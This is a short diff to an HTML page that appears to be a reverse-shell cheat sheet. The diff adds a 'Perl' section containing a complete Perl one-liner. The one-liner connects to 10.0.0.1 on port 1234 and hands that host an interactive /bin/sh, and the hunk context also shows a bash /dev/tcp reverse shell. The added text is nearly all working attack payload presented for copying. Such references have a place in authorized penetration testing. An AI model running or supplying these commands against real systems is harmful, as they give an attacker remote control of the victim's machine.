@@ -228,8 +228,27 @@ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 </pre>
                     </div>
                 </div>
+<br>
 
+                <div class="row">
+                    <div class="col-lg-12">
+                        <p class="lead"> 
+                            <b>Perl</b>
+                        </p>
+                    </div>
+                </div>
 
+                <div class="row">
+                    <div class="col-lg-12">
+<pre>
+<code class="shell"> 
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+</code>
+</pre>
+                    </div>
+                </div>
+<br>
 
                 <!-- Page Contect End -->
             </div>
